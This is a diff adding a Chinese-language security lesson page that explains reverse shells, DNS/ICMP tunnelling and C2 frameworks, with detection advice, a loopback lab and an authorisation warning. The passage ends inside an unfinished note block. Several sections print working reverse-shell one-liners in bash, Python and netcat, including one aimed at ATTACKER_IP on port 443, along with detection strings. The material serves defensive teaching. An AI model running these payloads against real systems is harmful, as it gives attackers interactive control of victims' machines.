@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 27 · 🔐 反弹 shell + C2 框架</title>
+<style>
+  :root {
+    --bg: #fff7ed;
+    --ink: #2a2a2a;
+    --muted: #6b6b6b;
+    --accent: #c2410c;
+    --accent-soft: #fed7aa;
+    --line: #e7e5e0;
+    --card: #ffffff;
+    --code-bg: #fef3e2;
+    --sec-border: #fdba74;
+    --danger: #dc2626;
+    --danger-bg: #fee2e2;
+  }
+  * { box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
+    background: var(--bg);
+    color: var(--ink);
+    line-height: 1.78;
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 32px 80px;
+  }
+  .header {
+    background: var(--card);
+    border: 1px solid var(--sec-border);
+    border-left: 6px solid var(--accent);
+    border-radius: 6px;
+    padding: 20px 24px;
+    margin-bottom: 28px;
+  }
+  .header h1 { font-size: 22px; margin: 0 0 8px; color: var(--accent); }
+  .header .meta { font-size: 13px; color: var(--muted); font-family: ui-monospace, "SF Mono", monospace; }
+  .header .sec-tag { display: inline-block; background: var(--accent); color: white; padding: 2px 10px; border-radius: 3px; font-size: 11px; margin-bottom: 8px; letter-spacing: 1px; }
+  .toc { background: var(--card); border: 1px solid var(--sec-border); border-radius: 6px; padding: 14px 20px; margin: 0 0 32px; font-size: 13.5px; }
+  .toc ol { margin: 4px 0; padding-left: 24px; }
+  .toc a { color: var(--accent); text-decoration: none; }
+  .toc a:hover { text-decoration: underline; }
+  .leadin { background: var(--card); border-left: 3px solid var(--accent-soft); padding: 14px 18px; border-radius: 4px; margin: 0 0 24px; font-size: 15px; }
+  .authbox { background: var(--danger-bg); border: 1px solid var(--danger); border-radius: 6px; padding: 14px 18px; margin: 0 0 32px; font-size: 14px; }
+  .authbox strong { color: var(--danger); }
+  h2 { font-size: 20px; margin-top: 48px; color: var(--accent); border-left: 4px solid var(--accent); padding-left: 12px; }
+  h3 { font-size: 16.5px; margin-top: 24px; color: #444; }
+  p { margin: 12px 0; }
+  code { background: var(--code-bg); padding: 1px 6px; border-radius: 3px; font-size: 13.5px; font-family: ui-monospace, "SF Mono", monospace; }
+  pre { background: var(--code-bg); padding: 14px 16px; border-radius: 6px; overflow-x: auto; font-size: 13.5px; line-height: 1.55; margin: 16px 0; border: 1px solid var(--sec-border); }
+  pre code { background: transparent; padding: 0; font-size: inherit; }
+  .ascii { font-family: ui-monospace, "SF Mono", monospace; font-size: 13px; background: var(--code-bg); padding: 16px 20px; border-radius: 6px; white-space: pre; overflow-x: auto; line-height: 1.4; margin: 18px 0; border: 1px solid var(--sec-border); }
+  table { border-collapse: collapse; width: 100%; margin: 16px 0; font-size: 14px; }
+  th, td { border: 1px solid var(--sec-border); padding: 10px 12px; text-align: left; vertical-align: top; }
+  th { background: var(--code-bg); font-weight: 600; }
+  .note { background: var(--card); border-left: 4px solid var(--accent-soft); padding: 12px 18px; border-radius: 4px; margin: 18px 0; font-size: 14.5px; }
+  .detect { background: #ecfdf5; border-left: 4px solid #059669; padding: 12px 18px; border-radius: 4px; margin: 18px 0; font-size: 14.5px; }
+  .detect strong { color: #047857; }
+  .connect { background: var(--card); border-left: 4px solid var(--accent); padding: 18px 22px; border-radius: 4px; margin: 36px 0; }
+  .connect h2 { margin-top: 0; border-left: none; padding-left: 0; }
+  .exercise { background: var(--card); border: 1px solid var(--sec-border); border-radius: 6px; padding: 18px 22px; margin: 16px 0; }
+  .exercise-num { display: inline-block; background: var(--accent); color: white; width: 22px; height: 22px; border-radius: 50%; text-align: center; font-size: 12px; line-height: 22px; margin-right: 8px; }
+  .next { margin-top: 48px; padding: 14px 18px; background: var(--card); border: 1px dashed var(--accent-soft); border-radius: 4px; font-size: 14px; color: var(--muted); }
+  .next strong { color: var(--accent); }
+  .key { background: linear-gradient(transparent 60%, var(--accent-soft) 60%); padding: 0 2px; }
+  ul, ol { padding-left: 24px; }
+  li { margin: 4px 0; }
+  .term { color: var(--accent); font-weight: 600; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="sec-tag">🔐 SECURITY · 周六安全主线</div>
+  <h1>反弹 shell 与 C2 框架：远程控制的底层原理与检测</h1>
+  <div class="meta">Day 27 · Week 04 · 2026-07-15 · 攻防原理 + 蓝队检测 · 预计 4h（2.5h 阅读 + 1.5h 授权环境实操）</div>
+</div>
+
+<div class="authbox">
+  <strong>⚠️ 授权与合规声明（务必先读）</strong><br>
+  本文是 Agent 安全工程师的<b>防御性教育材料</b>。反弹 shell、隧道、C2 都是红队/蓝队都必须理解的基础技术——蓝队不懂攻击者长什么样，就写不出检测规则。<br>
+  但请严格遵守：本文所有命令<b>只允许在你自己拥有、且完全隔离的实验环境</b>（本机 <code>127.0.0.1</code>、你自己的两台 VM、或明确书面授权的靶场）里运行。<br>
+  <b>禁止</b>对公司办公网、生产系统、任何未经书面授权的主机做扫描、穿透、反弹或隧道——这可能触犯法律并违反公司安全规范。有真实业务需要（如红蓝演练）必须先走安全/IT 审批。本文对每个攻击技术都配套<b>「蓝队怎么发现它」</b>，这才是你今天真正要带走的东西。
+</div>
+
+<div class="leadin">
+  一个攻击者拿到了一台服务器上的命令执行漏洞（比如 RCE、SSRF 打穿、或钓到了一个能跑代码的入口），下一步他想要什么？——一个能<b>稳定、交互、隐蔽</b>地敲命令的通道。今天我们就拆解这个「通道」是怎么建立的：为什么攻击者几乎总是选「反弹」而不是「正连」？一行 bash 是怎么把 shell 送出去的？防火墙明明拦了入站，为什么还是拦不住？DNS 查询、ICMP ping 这种「人畜无害」的协议怎么就成了数据外带隧道？当单个 shell 升级成 Cobalt Strike / Sliver 这种工业级 C2，攻击者获得了什么？最重要的是——作为守方，这些活动在流量和主机日志里留下了什么可被抓住的痕迹？读完你会建立一个完整的「远程控制」心智模型，并能亲手在本机搭一个最小反弹链路、再从蓝队视角把它抓出来。
+</div>
+
+<div class="toc">
+  <strong>今日目录</strong>
+  <ol>
+    <li><a href="#s1">Bind vs Reverse：连接方向决定一切</a></li>
+    <li><a href="#s2">各语言的反弹 payload：一行代码的解剖</a></li>
+    <li><a href="#s3">防火墙为什么拦不住：出站过滤与端口伪装</a></li>
+    <li><a href="#s4">DNS / ICMP 隧道：把数据藏进「正常」协议</a></li>
+    <li><a href="#s5">从单个 shell 到 C2：架构、Beacon、Staging</a></li>
+    <li><a href="#s6">工业级 C2 框架：Cobalt Strike / Sliver / Mythic</a></li>
+    <li><a href="#s7">蓝队检测思路：网络侧 + 主机侧</a></li>
+    <li><a href="#s8">🔧 实战：在本机搭建并检测一条反弹链路</a></li>
+    <li><a href="#connect">与 AI / Agent 安全的连结</a></li>
+    <li><a href="#ex">今日小练习</a></li>
+  </ol>
+</div>
+
+<h2 id="s1">1 · Bind vs Reverse：连接方向决定一切</h2>
+
+<p>要理解反弹 shell，先回到 Week 03/04 学的 TCP：一次连接总有一方 <span class="term">监听（listen/accept）</span>、另一方 <span class="term">主动拨号（connect）</span>。谁监听、谁拨号——这个方向的选择，是所有远程控制技术的分水岭。</p>
+
+<h3>1.1 两种模型</h3>
+<p><span class="term">Bind shell（正向/绑定 shell）</span>：<b>被控主机（victim）监听一个端口</b>，攻击者主动 connect 过去。攻击者说「我去连你」。</p>
+<p><span class="term">Reverse shell（反弹/反向 shell）</span>：<b>攻击者机器（handler）监听一个端口</b>，被控主机主动 connect 回来。被控端说「我来连你」。这就是「反弹」二字的由来——shell 是被「弹回」到攻击者那边的。</p>
+
+<div class="ascii">          BIND SHELL                          REVERSE SHELL
+ 攻击者 ──connect──▶ [victim:4444 listen]   [attacker:4444 listen] ◀──connect── 被控端
+        主动去敲被控端的门                    被控端主动往外拨号回连攻击者
+
+ 谁监听：  victim（被控端）                  谁监听：  attacker（攻击者）
+ 谁拨号：  attacker                          谁拨号：  victim
+</div>
+
+<h3>1.2 为什么攻击者几乎总选 Reverse？</h3>
+<p>关键在于<span class="term">防火墙的不对称性</span>。企业网络的边界防火墙普遍是这样配置的：</p>
+<ul>
+  <li><b>入站（inbound）严格</b>：外面主动连进来的，默认全拒，只放行明确开的服务端口（如 443）。所以 bind shell 里 victim 开的 <code>4444</code> 端口，攻击者从公网根本连不进来。</li>
+  <li><b>出站（outbound）宽松</b>：内部机器访问外网（浏览器上网、软件更新、调 API）是刚需，所以出站常常大面积放行，尤其是 <code>80/443/53</code>。</li>
+</ul>
+<p><span class="key">Reverse shell 正是利用了「出站宽松」这个缺口</span>：让被控端<b>主动往外拨号</b>，从防火墙看这就是一次「内部机器访问外网」的普通行为。加上 NAT——内网机器通常没有公网 IP，外部根本无法直接寻址它，只有它主动出去才能建立连接。这两点叠加，让 reverse 成为默认选择。</p>
+
+<table>
+  <tr><th>维度</th><th>Bind shell</th><th>Reverse shell</th></tr>
+  <tr><td>victim 角色</td><td>监听端口</td><td>主动外连</td></tr>
+  <tr><td>过防火墙</td><td>难（入站被拦）</td><td>易（伪装成出站流量）</td></tr>
+  <tr><td>过 NAT</td><td>难（victim 无公网 IP）</td><td>易（主动出去）</td></tr>
+  <tr><td>暴露面</td><td>victim 多开一个端口，易被扫到</td><td>victim 不开端口，更隐蔽</td></tr>
+  <tr><td>attacker 需求</td><td>无需公网 IP</td><td>需一个可被回连的公网 IP/域名</td></tr>
+</table>
+
+<div class="detect">
+<strong>🛡 蓝队视角</strong>：Bind shell 会让主机上多出一个奇怪的 LISTEN 端口——<code>ss -ltnp</code> 就能看到一个非预期进程在监听。Reverse shell 不开端口，但会产生一条<b>从服务器主动发起、去往陌生外部 IP 的长连接</b>——这在「一台后端数据库服务器为什么要主动连公网 IP」这种语境下极其可疑。方向，就是第一个检测信号。
+</div>
+
+<h2 id="s2">2 · 各语言的反弹 payload：一行代码的解剖</h2>
+
+<p>反弹 shell 的「一行 payload」在网上到处都是，但作为蓝队你要能<b>逐字读懂它在干什么</b>，才能写出精准的检测规则。我们不追求收集全，而是解剖两三个最经典的，理解共同结构。</p>
+
+<h3>2.1 反弹 shell 的三步共同结构</h3>
+<p>无论哪种语言，一个反弹 shell 都在做同样三件事：</p>
+<ol>
+  <li><b>建立 socket</b>：向 attacker 的 <code>IP:PORT</code> 发起 TCP 连接（回顾 Week 03 的 <code>connect()</code> 系统调用）。</li>
+  <li><b>重定向标准流</b>：把 shell 进程的 <code>stdin(0) / stdout(1) / stderr(2)</code> 三个文件描述符，全部接到这个 socket 上（回顾 Week 01/02 的 fd 与 <code>dup2</code>）。</li>
+  <li><b>启动交互 shell</b>：<code>exec</code> 一个 <code>/bin/sh</code> 或 <code>bash</code>，于是攻击者在自己终端敲的字，通过 socket 变成 shell 的输入；shell 的输出又通过 socket 回到攻击者屏幕。</li>
+</ol>
+<p><span class="key">你会发现这正是 Day 01「hello world 的旅程」和 Day 02「fork-exec」的组合应用</span>：socket 是一个 fd，dup2 把它复用到 0/1/2，exec 换上 shell 的程序镜像——底层原理你早就学过了。</p>
+
+<h3>2.2 攻击者侧：监听器（handler）</h3>
+<p>攻击者先在自己机器上开一个监听器，等 shell 弹回来。最原始的就是 netcat：</p>
+<pre><code># attacker（你的实验机 / 本机）: 监听 4444，等待回连
+nc -lvnp 4444
+#  -l 监听  -v 详细  -n 不做DNS解析  -p 端口</code></pre>
+
+<h3>2.3 被控侧：几种经典 payload（仅实验环境）</h3>
+<p><b>Bash 的 <code>/dev/tcp</code>（无需任何额外工具，最经典）：</b></p>
+<pre><code># victim（你的另一台VM / 本机回环）: 把 /bin/bash 接到 attacker 的 socket
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1</code></pre>
+<p>逐段拆解（这是今天最该读懂的一行）：</p>
+<ul>
+  <li><code>bash -i</code>：启动一个<b>交互式（interactive）</b> bash。</li>
+  <li><code>/dev/tcp/127.0.0.1/4444</code>：这不是真实文件，而是 bash 的一个<b>虚拟设备</b>——打开它就等于向 <code>127.0.0.1:4444</code> 建立一条 TCP 连接。</li>
+  <li><code>&gt;&amp;</code>：把 stdout <b>和</b> stderr 都重定向到这个 socket。</li>
+  <li><code>0&gt;&amp;1</code>：把 stdin(0) 也重定向到刚才那个 socket（1 现在指向 socket）。于是 0/1/2 全接到网络了——攻击者敲的命令进来、结果出去。</li>
+</ul>
+
+<p><b>Python（跨平台，可读性高，也是最好教学的版本）：</b></p>
+<pre><code># victim: 与上面等价，逐步做 socket + dup2 + exec
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'</code></pre>
+<p>这里你能一眼看到三步：<code>s.connect(...)</code> 建 socket；<code>os.dup2(s.fileno(), f)</code> 把 fd 0/1/2 都指到 socket（就是那个 <code>dup2</code> 系统调用！）；<code>pty.spawn("/bin/bash")</code> 起一个带伪终端的交互 shell。</p>
+
+<p><b>netcat 版（老牌，但很多现代系统删掉了 <code>-e</code> 选项）：</b></p>
+<pre><code># 若 nc 支持 -e：直接把 shell 交给连接
+nc 127.0.0.1 4444 -e /bin/bash
+# 若不支持 -e：用命名管道（FIFO）绕过——这也是检测特征之一
+mkfifo /tmp/f; nc 127.0.0.1 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1</code></pre>
+
+<div class="note">
+<b>为什么原始 shell 很难用？</b>——直接弹回来的 shell 没有真正的 TTY：不能用 <code>Ctrl-C</code>（会直接杀掉整个 nc）、不能用 <code>vim</code>、Tab 补全和方向键都失灵。攻击者拿到 shell 后的第一件事往往是「<span class="term">TTY 升级</span>」：<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>，再配合 <code>stty raw -echo</code> 拿到一个体面的交互终端。<b>蓝队线索</b>：一个进程刚建立外连、紧接着就 spawn 了 pty，是很强的信号。</p>
+</div>
+
+<div class="detect">
+<strong>🛡 蓝队视角</strong>：这些 payload 在<b>进程命令行</b>里留下极显眼的字符串——<code>/dev/tcp/</code>、<code>pty.spawn</code>、<code>dup2</code>、<code>mkfifo</code>、<code>nc ... -e</code>。EDR/auditd 监控 <code>execve</code> 事件时，一条 <code>bash -c</code> 里出现 <code>/dev/tcp</code> 几乎可以直接告警。此外「<b>一个网络服务进程（如 nginx/java）突然 fork 出 /bin/bash 并带外连</b>」这种<b>异常父子进程链</b>，是比匹配字符串更稳的行为检测。</p>
+</div>
+
+<h2 id="s3">3 · 防火墙为什么拦不住：出站过滤与端口伪装</h2>
+
+<p>很多人第一次听到反弹 shell 会困惑：「公司不是有防火墙吗？」——防火墙确实在，但攻击者是<b>顺着防火墙的规则走</b>，而不是硬闯。</p>
+
+<h3>3.1 出站过滤（egress filtering）的现实</h3>
+<p>理想的安全网络应该做严格的<span class="term">出站白名单</span>：内部机器只能访问明确允许的目的地。但现实中：</p>
+<ul>
+  <li>业务需要访问无数外部 API、更新源、CDN，白名单维护成本极高，于是很多网络出站几乎全放。</li>
+  <li>即使做了出站过滤，<code>443（HTTPS）</code> 和 <code>53（DNS）</code> 几乎不可能封——封了员工没法上网、机器没法解析域名。</li>
+</ul>
+<p>攻击者的对策就是<span class="key">把回连端口伪装成最不可能被封的端口</span>：让 reverse shell 回连 attacker 的 <code>443</code>。从防火墙日志看，这就是一条「内部机器访问某个 HTTPS 站点」的普通出站流量。</p>
+
+<pre><code># attacker 在 443 监听（需要 root 绑定低端口）
+sudo nc -lvnp 443
+# victim 回连 443，混在正常 HTTPS 出站流量里
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1</code></pre>
+
+<h3>3.2 更进一步：真的裹上 TLS</h3>
+<p>只用 443 端口但明文传输，会被<span class="term">深度包检测（DPI）</span>识破——「443 端口上跑的居然不是 TLS 握手」本身就是异常。所以工业级工具会把 C2 流量<b>真的封装进 TLS</b>，甚至套上合法的域名和证书。这就引出了下一节的隧道与后面的 C2。</p>
+
+<div class="detect">
+<strong>🛡 蓝队视角</strong>：不要只看端口，要看<b>「端口 vs 协议是否一致」</b>。443 上没有 TLS 握手、或 TLS 之后是纯裸字节流，是强异常。同时做<b>出站基线</b>：一台数据库服务器历史上从不主动连公网，某天开始周期性连一个陌生海外 IP 的 443——即使加密，这个「谁在连、连了谁、连接节律」的元数据也足够告警。加密保护了内容，保护不了<b>连接模式</b>。
+</div>
+
+<h2 id="s4">4 · DNS / ICMP 隧道：把数据藏进「正常」协议</h2>
+
+<p>当出站过滤严到连 443 直连都受限，只有 DNS 能出去时，攻击者还有一招：<span class="term">协议隧道（tunneling）</span>——把控制数据编码进本该用来做别的事的协议里。</p>
+
+<h3>4.1 DNS 隧道原理</h3>
+<p>DNS 是「几乎永远开着」的协议：内网机器就算什么都上不了网，也得能解析域名，所以 <code>53</code> 端口的出站 DNS 查询通常直达。攻击者利用这点：</p>
+<div class="ascii">victim 想外带数据 "secret" ──▶ 构造一个 DNS 查询:
+    aGVsbG8.secret.attacker-c2.com   （把数据 base32 编码塞进子域名）
+         │
+         ▼  查询沿正常 DNS 递归链路走出内网
+   企业DNS ──▶ 根/权威DNS ──▶ attacker-c2.com 的权威服务器（攻击者控制）
+         │                              │
+         │      攻击者在权威服务器端     ▼ 解析出子域名 = 收到 "secret"
+         │      把要下发的指令编码进       并用 TXT/CNAME 记录把指令回给 victim
+         ▼◀────────────────────────────
+</div>
+<p>核心洞见：<span class="key">攻击者注册一个域名并自建它的权威 DNS 服务器</span>。任何对 <code>*.attacker-c2.com</code> 的查询，最终都会被递归 DNS 送到攻击者的服务器。于是「子域名」成了上行数据通道、DNS 应答（TXT/CNAME）成了下行指令通道。工具如 <code>iodine</code>、<code>dnscat2</code> 就是干这个的。代价是带宽极低、延迟高，但极其隐蔽、穿透力极强。</p>
+
+<h3>4.2 ICMP 隧道原理</h3>
+<p>ICMP 是 ping 用的协议。<code>ping</code> 的 echo request/reply 报文里有一个<b>数据载荷字段</b>（本来用来测延迟）。攻击者把数据塞进这个载荷，靠一来一回的 ping 传输数据。若网络允许 ping 出站（很多网络为了运维便利会放行），就多了一条隐蔽通道。工具如 <code>ptunnel</code>、<code>icmpsh</code>。</p>
+
+<table>
+  <tr><th>隧道</th><th>藏在哪</th><th>为什么能出去</th><th>代价</th></tr>
+  <tr><td>DNS</td><td>子域名 + TXT/CNAME 应答</td><td>DNS 几乎永远放行</td><td>带宽极低、延迟高</td></tr>
+  <tr><td>ICMP</td><td>ping 报文的数据载荷</td><td>ping 常被放行做运维</td><td>易被限流、无状态难可靠</td></tr>
+  <tr><td>HTTPS</td><td>真实 TLS 会话内</td><td>混入正常 web 流量</td><td>需域名/证书，成本高但最像真的</td></tr>
+</table>
+
+<div class="detect">
+<strong>🛡 蓝队视角</strong>：DNS 隧道的指纹非常明显——<b>异常长的子域名</b>、<b>高熵（看起来像随机 base32）的标签</b>、<b>对同一个二级域名的超高频查询</b>、<b>大量 TXT 记录请求</b>。用 Zeek/Suricata 统计「单位时间对某域名的查询次数」和「查询名长度分布」就能抓。ICMP 隧道则看<b>载荷异常大、内容非固定 pattern、双向流量对称</b>的 ping。这两者都是「协议被用来做它不该做的事」——检测的本质是<b>行为偏离协议正常语义</b>。
+</div>
+
+<h2 id="s5">5 · 从单个 shell 到 C2：架构、Beacon、Staging</h2>
+
+<p>一个裸 <code>nc</code> 反弹 shell 对真实攻击者来说太脆弱了：连接一断就没了、只能控一台、流量裸奔、一关终端全丢。当攻击者要长期、规模化地控制一批主机，就需要 <span class="term">C2（Command and Control，命令与控制）</span> 框架。</p>
+
+<h3>5.1 C2 的基本架构</h3>
+<div class="ascii">                    ┌────────────────────────┐
+                    │   Team Server / C2 后端 │  ◀── 操作员(operator)们
+                    │  (下发任务、收集结果)     │      通过控制台接入
+                    └───────────┬────────────┘
+          ┌─────────────────────┼─────────────────────┐
+          ▼                     ▼                     ▼
+   [Implant/Beacon A]    [Implant/Beacon B]    [Implant/Beacon C]
+     被控主机1              被控主机2              被控主机3
+   周期性回连「拿任务」    （Redirector/CDN 域前置可夹在中间做流量伪装）
+</div>
+<ul>
+  <li><span class="term">Implant / Agent / Beacon</span>：种在被控主机上的那个「客户端」程序。它不是一直挂着连接，而是<b>周期性地「打卡」</b>。</li>
+  <li><span class="term">Team Server</span>：攻击者的后端，管理所有 implant、派发任务、汇总结果，支持多个操作员协同。</li>
+  <li><span class="term">Redirector / 域前置</span>：夹在中间的中转层，让 implant 表面上在连一个正常的 CDN 域名，隐藏真实 C2 地址。</li>
+</ul>
+
+<h3>5.2 Beacon 模型：为什么是「打卡」而不是「长连」</h3>
+<p>这是 C2 最重要的设计。裸 shell 是一条<b>持续在线的长连接</b>——极易被「长时间存活的可疑连接」检测抓住。C2 的 Beacon 反过来：</p>
+<ul>
+  <li><span class="term">Sleep / Interval（回连间隔）</span>：implant 每隔比如 60 秒才连一次 team server，问「有活干吗？」，拿了任务、交了结果就立刻断开。绝大多数时间它是<b>静默的</b>。</li>
+  <li><span class="term">Jitter（抖动）</span>：在间隔上加随机扰动（如 ±30%），让打卡时间不规律，避免「每 60.0 秒精确一次」这种机器规律被统计检测抓到。</li>
+</ul>
+<p><span class="key">Beacon 模型把「一条长连接」拆成「无数条短连接 + 随机节律」</span>，用牺牲实时性换取隐蔽性——这是 C2 与玩具 shell 的本质区别。</p>
+
+<h3>5.3 Staging：分阶段载荷</h3>
+<p>初始能塞进 victim 的往往只有很小的执行空间（一个短命令、一段宏）。于是用<span class="term">分阶段（staged）</span>投递：</p>
+<ol>
+  <li><b>Stager（第一阶段）</b>：极小的一段代码，唯一任务是「去 team server 下载真正的载荷并在内存里执行」。</li>
+  <li><b>Stage / Payload（第二阶段）</b>：完整功能的 implant，通常<b>只在内存里运行、不落地成文件</b>（fileless），躲避磁盘杀软扫描。</li>
+</ol>
+<p>对应还有 <span class="term">stageless</span>：一次性把完整 implant 塞进去，体积大但不需要二次下载，少一次可疑网络请求。攻击者按场景权衡。</p>
+
+<div class="detect">
+<strong>🛡 蓝队视角</strong>：Beacon 的隐蔽在于随机化，但它逃不掉<b>「周期性」这个统计本质</b>。即使加了 jitter，把一台主机对某目的地的连接时间点画成时间线，仍会呈现<b>可被统计学检测的规律性</b>（这类分析叫 <em>beaconing detection</em>，如计算连接时间间隔的方差/自相关）。此外 stager 会产生「<b>下载一段数据后直接在内存执行、进程无对应磁盘文件</b>」的 fileless 特征，是 EDR 内存扫描的重点。
+</div>
+
+<h2 id="s6">6 · 工业级 C2 框架：Cobalt Strike / Sliver / Mythic</h2>
+
+<p>了解主流 C2 框架，不是为了用它们攻击，而是因为<span class="key">蓝队每天要对抗的就是它们</span>——认识它们的默认行为和流量指纹，才能检测。以下是概念性对比。</p>
+
+<table>
+  <tr><th>框架</th><th>定位</th><th>关键特征</th><th>蓝队要点</th></tr>
+  <tr><td><b>Cobalt Strike</b></td><td>商业红队工具（被破解后广泛被真实攻击者滥用）</td><td>Beacon 载荷；Malleable C2 profile 可高度自定义流量伪装；业界事实标准</td><td>有大量已知的默认 profile 指纹、默认证书、内存特征可检测（如著名的默认 spawnto、命名管道名）</td></tr>
+  <tr><td><b>Sliver</b></td><td>开源（BishopFox），Go 编写</td><td>跨平台、支持 mTLS/HTTP(S)/DNS/WireGuard 多种回连；无需 CS 的高价授权，近年真实攻击中上升快</td><td>Go 编译的二进制体积大、有 Go runtime 特征；默认配置也有可指纹的行为</td></tr>
+  <tr><td><b>Mythic</b></td><td>开源、模块化 C2 平台</td><td>基于 Docker 的插件化架构，agent 与 C2 profile 解耦，可挂载各种自定义 agent（Apollo、Poseidon 等）</td><td>因高度可定制，指纹分散，更依赖行为检测而非静态特征</td></tr>
+</table>
+
+<h3>6.1 这些框架相比裸 shell 多了什么</h3>
+<ul>
+  <li><b>会话管理</b>：同时管理成百上千 implant，断线自动重连。</li>
+  <li><b>加密与伪装</b>：内置 TLS、Malleable profile 把流量伪装成访问某正常网站（模仿真实 User-Agent、URI、Cookie 结构）。</li>
+  <li><b>后渗透模块</b>：内置提权、抓凭据（回顾 Day 06）、横向移动（下周 Day 97 内网渗透）、端口转发、socks 代理等一整套。</li>
+  <li><b>无文件执行</b>：注入进合法进程、内存执行，减少磁盘落地。</li>
+</ul>
+
+<div class="note">
+<b>为什么蓝队要研究它们的「默认值」？</b>——攻击者若不改默认配置，会留下大量可指纹的痕迹：Cobalt Strike 历史上有默认的自签名证书序列号、默认的 named pipe 命名规律、Malleable profile 里默认的 URI 模式；这些都被威胁情报做成了检测规则（如 JARM/JA3 TLS 指纹、Suricata 规则集）。<span class="key">攻击者的隐蔽是要花成本改默认的，而懒惰是普遍的</span>——这正是防守方的机会。
+</div>
+
+<h2 id="s7">7 · 蓝队检测思路：网络侧 + 主机侧</h2>
+
+<p>把前面每节的检测碎片汇成一张系统的「检测地图」。检测反弹 shell / C2 分两个战场：</p>
+
+<h3>7.1 网络侧（Network Detection）</h3>
+<ul>
+  <li><b>出站基线与方向异常</b>：服务器主动外连本身就少见。建立「哪台机器正常会连哪些目的地」的基线，对偏离告警。数据库/内部服务器主动连公网 = 高危。</li>
+  <li><b>Beaconing 检测</b>：对每对 (源, 目的) 统计连接时间间隔，找周期性（含加 jitter 的近周期性）。工具：Zeek + RITA、Suricata、商业 NDR。</li>
+  <li><b>端口/协议一致性</b>：443 上无 TLS、DNS 查询名超长高熵、ICMP 载荷异常——协议被滥用的信号。</li>
+  <li><b>TLS 指纹</b>：<code>JA3/JA3S</code>（客户端/服务端 TLS 握手指纹）、<code>JARM</code>（主动探测 C2 服务端指纹）可识别已知 C2 家族。</li>
+  <li><b>威胁情报</b>：已知 C2 IP/域名黑名单（时效性有限，攻击者常换基础设施）。</li>
+</ul>
+
+<h3>7.2 主机侧（Endpoint Detection）</h3>
+<ul>
+  <li><b>异常父子进程链</b>：<code>nginx → bash → /dev/tcp</code>、<code>java → sh → curl|bash</code>、Office → powershell 等。web/DB 服务进程 fork 出 shell 是最强信号之一。</li>
+  <li><b>命令行字符串匹配</b>：<code>/dev/tcp/</code>、<code>pty.spawn</code>、<code>mkfifo</code> + <code>nc</code>、<code>bash -i</code>、base64 解码后管道给 shell（<code>echo ... | base64 -d | bash</code>）。</li>
+  <li><b>可疑网络系统调用</b>：用 <b>auditd</b> 或 <b>eBPF（回顾 Day 13 的 Falco/Tetragon 预告）</b>监控 <code>connect()</code>、<code>socket()</code>，关联「进程 + 外连目的地」。</li>
+  <li><b>Fileless / 内存执行</b>：进程有网络活动但无对应磁盘映像、进程内存中有可执行匿名页——EDR 内存扫描重点。</li>
+  <li><b>非交互进程突然要 TTY</b>：服务账户 spawn pty、<code>stty raw -echo</code> 出现在非登录会话里。</li>
+</ul>
+
+<div class="detect">
+<strong>🛡 核心检测哲学</strong>：单条特征都能被绕过（改端口、改字符串、加 jitter、改默认 profile）。稳健的检测靠<b>行为 + 上下文 + 多信号关联</b>：不是「看到 /dev/tcp 就报警」，而是「一个本不该联网的服务进程，fork 出 shell，向陌生外部 IP 建立了周期性加密连接」——把网络侧和主机侧的信号<b>拼成一条攻击链</b>，误报低、绕过难。这也正是你本职做 Agent 安全时该有的思路：<b>单点规则脆弱，纵深关联稳健</b>。
+</div>
+
+<h2 id="s8">8 · 🔧 实战：在本机搭建并检测一条反弹链路</h2>
+
+<p><b>目标</b>：在<b>同一台你自己的 Mac/Linux（用 <code>127.0.0.1</code> 回环，完全不出网）</b>上，亲手起一个最小反弹 shell，然后从蓝队视角用系统工具把它「抓」出来。全程只在本机回环，零对外风险。</p>
+
+<h3>步骤 1：开监听器（终端 A）</h3>
+<pre><code># macOS 自带 nc；Linux 建议 ncat（来自 nmap）
+nc -lvnp 4444
+# 看到 "Listening on 0.0.0.0 4444" 表示在等回连</code></pre>
+
+<h3>步骤 2：弹一个 shell 回来（终端 B）</h3>
+<pre><code># Python 版最稳、跨平台。注意目标是 127.0.0.1，只走回环
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'</code></pre>
+<p>回到终端 A，你应该能敲 <code>id</code>、<code>whoami</code>、<code>ls</code> 并看到结果——这就是一条工作的反弹 shell。体会：你在 A 敲的字，通过 socket 变成了 B 那个 shell 的输入。</p>
+
+<h3>步骤 3：蓝队——用 <code>lsof</code> / <code>ss</code> 看连接</h3>
+<pre><code># Linux: 看谁在监听、谁建立了连接，以及对应进程
+ss -tnp | grep 4444
+# macOS: lsof 看 4444 端口相关的进程与连接
+lsof -i :4444
+# 你会看到：一端是 nc(监听)，另一端是 python3(建立了到 127.0.0.1:4444 的连接)</code></pre>
+<p>观察重点：<b>那个 <code>python3</code> 进程既在跑代码、又持有一条网络连接、还 spawn 了 <code>/bin/sh</code></b>——正是异常父子链 + 外连的组合特征。</p>
+
+<h3>步骤 4：蓝队——看进程树与命令行</h3>
+<pre><code># Linux: 看 python3 的完整命令行（--forest 显示父子关系）
+ps -ef --forest | grep -A2 -B2 python3
+# macOS:
+ps -ax -o pid,ppid,command | grep pty
+# 命令行里赤裸裸的 socket.connect + dup2 + pty.spawn 就是检测特征</code></pre>
+
+<h3>步骤 5：（进阶）用 strace/dtruss 看系统调用</h3>
+<pre><code># Linux: 追踪反弹进程实际发起的 connect() 系统调用（回顾 Day 05/13）
+strace -f -e trace=network python3 -c '...上面的payload...'
+# 你会看到 socket() 和 connect(... 127.0.0.1:4444 ...) 赫然在列
+# macOS 对应 sudo dtruss（需关闭SIP或对自有二进制）</code></pre>
+
+<h3>步骤 6：清理</h3>
+<pre><code># 在终端 A 的 shell 里 exit，或直接 Ctrl-C 关掉 nc
+# 确认端口已释放
+ss -tnp | grep 4444    # 应无输出</code></pre>
+
+<div class="note">
